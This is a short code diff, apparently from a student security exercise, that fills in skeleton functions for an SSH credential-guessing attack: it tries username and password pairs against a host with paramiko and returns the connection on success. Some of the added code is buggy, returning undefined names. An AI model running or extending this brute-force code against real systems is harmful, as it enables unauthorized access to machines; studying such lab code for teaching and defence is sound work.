@@ -105,6 +105,14 @@ def tryCredentials(host, userName, password, sshClient):
 	# in the comments above the function
 	# declaration (if you choose to use
 	# this skeleton).
+	try:
+		sshClient.connect(host,username=userName,password=password)
+	except socket.error:
+		return 3
+	except paramiko.SSHException:
+		return 1
+	return 0
+
 	pass
 
 ###############################################################
@@ -142,8 +150,13 @@ def attackSystem(host):
 		# return a tuple containing an
 		# instance of the SSH connection
 		# to the remote system. 
-		pass	
+		attemptResults=tryCredentials(host, userName, password, sshClient)
+		if(attemptResults != 0):
+			pass
 			
+		else:
+			return(ssh,username,password)
+		
 	# Could not find working credentials
 	return None	
 
